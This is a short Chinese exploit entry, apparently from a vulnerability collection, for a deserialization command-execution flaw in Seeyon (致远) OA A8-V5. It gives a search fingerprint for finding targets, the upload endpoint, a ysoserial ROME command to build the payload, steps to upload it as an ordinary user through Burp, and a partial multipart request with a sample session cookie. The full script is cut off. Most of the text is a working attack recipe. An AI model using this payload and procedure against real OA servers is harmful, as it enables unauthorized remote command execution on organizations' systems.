# 致远OAcheckComponentFile存在反序列化任意命令执行

- **系统**：致远OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="致远A8-V5"`
- **请求**：`POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1`

**请求体 / payload**
```
此漏洞需要一个普通用户的权限。
**1.首先使用以下命令生成反序列化文件**
java -jar ysoserial.jar ROME “calc” > rome.ser
ysoserial.jar地址：[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
并把 rome.ser 文件打包成压缩包 rome.zip
**2.登录普通用户，进入后台 点击新建事项，打开burp进行抓包**
点击上传附件选择反序列化压缩包，其他内容随便写点，然后再点击发送
Host:
Content-Length: 2721
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7uKDzBJkrUpg9vNV
Cookie: JSESSIONID=B60C4B18A79FE86F7E87F8472BAA75BE; loginPageURL=; avatarImageUrl=-537588736770816621; login_locale=zh_CN
------WebKitFormBoundary7uKDzBJkrUpg9vNV
Content-Disposition: form-data; name="type"
0
--…（脚本共 5034 字，完整版见原文）
```
- **预期**：200　|　—